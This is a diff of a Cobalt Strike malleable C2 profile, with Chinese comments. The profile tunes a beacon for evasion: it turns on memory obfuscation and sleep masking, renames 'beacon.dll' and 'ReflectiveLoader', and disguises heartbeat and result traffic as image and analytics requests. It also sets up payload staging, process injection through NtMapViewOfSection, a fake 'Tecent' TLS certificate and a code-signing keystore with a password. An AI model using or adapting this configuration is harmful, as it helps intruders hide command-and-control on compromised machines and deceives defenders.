@@ -6,14 +6,12 @@ set maxdns    "255";	# 通过DNS来上传数据的时候的最大hostname长度
 set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36";
 
 
-#stage模块控制beacon.dll文件的具体细节
 stage {	
-	set userwx		   "false"; #规避rwx权限的内存分配
-	set obfuscate	   "true";  #混淆IAT
-	set cleanup        "true";	#释放不必要的内存
-
+	set userwx		   "false";
+	set obfuscate	   "true";
+	set cleanup        "true";
 	set checksum       "0";
-	set sleep_mask     "true" ; #内存混淆
+	set sleep_mask     "true" ;
 	set compile_time   "15 May 1980 13:25:14";
 	set entry_point    "7440";
 	set name           "wkscli.dll";
@@ -47,22 +45,18 @@ stage {
 
 	# get rid of some standard Cobalt Strike stuff.
 	transform-x86 {
-		append "\x56\x67\x37\x76\x82\xb2\xb6\x7b\xb5\xb3\xef\x13\xb6\xb2\xb6\x7b\xb3\xb3\xfd\x13\xb6\xb2\xb6\x81\x56\x67\x37\x76\x82\x81\x56\x67\x37\x76\x82\x81";
-		prepend "\x67\x43\x67\x56\x67\x37\x76\x82\x81\x56\x67\x37\x76\x82\x81\x77";
+		prepend "\xB6\x84\x38";
 		strrep "beacon.dll" "wkscli.dll";
 		strrep "ReflectiveLoader" "ipconfig";
 	}
 
 	transform-x64 {
-		append "\x56\x67\x37\x76\x56\x67\xb2\xb6\x7b\xb5\xb3\xef\x13\xb6\xb2\xb6\x7b\xb3\xb3\xfd\x13\xb6\xb2\xb6\x37\x76\x82\x81\x56\x67\x37\x76\x82\x81\x82\x81";
-		prepend "\x67\x43\x67\x77\x56\x67\x37\x76\x82\x81\x56\x67\x37\x76\x82\x81";
+		prepend "\x90\x90\x90";
 		strrep "beacon.x64.dll" "wkscli.dll";
 		strrep "ReflectiveLoader" "ipconfig";
 	}
 }
 
-
-#http-get模块控制心跳包的具体细节
 http-get {
 
     set uri "/news/pictures/animals/cat.jpg /ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";# 设置get请求涉及到的uri，get请求一般是心跳包，beacon会随机从里面找一个请求
@@ -82,7 +76,6 @@ http-get {
             base64;
             prepend "uuid_tt_dd=10_306329eXixmCiGSrA==4863-704131;tokenInfo=SownINownOnewom";
             append  "/sOBwoNmqvsnw6wo==";
-
             header "Cookie";
         }
     }
@@ -107,8 +100,6 @@ http-get {
     }
     }
 
-
-#http-post控制命令执行结果传输的具体细节
 http-post {
 	# 主要用于传输任务执行结果的回显。
 
@@ -150,7 +141,7 @@ http-post {
     }
 }
 
-#http-stager控制分阶段传输payload的具体细节
+
 http-stager {
 	#控制分阶段下载payload的方式
 	set uri_x86 "/fish.jpg"; 
@@ -168,15 +159,23 @@ http-stager {
 			}
 	} 
 }
-
-
-#http-config控制全局配置http服务器的细节
+https-certificate {
+	set CN "Tecent";
+	set  OU "TC";
+	set O "Tecent";
+	set  L "Beijing";
+	set ST "DC";
+	set C "US";
+}
+code-signer{
+	set keystore "perfect.store";
+	set password "78787878";
+	set alias "shanfenglan";
+}
 http-config{
 	set trust_x_forwarded_for "true";
 }
 
-
-#process-inject控制进程注入的具体细节
 process-inject {
 	set allocator	"NtMapViewOfSection";
 	execute {
@@ -185,6 +184,7 @@ process-inject {
 	}
 
 }
+
 
 
 #post-ex控制后渗透模块特定进程注入过程例如hashdump的具体细节
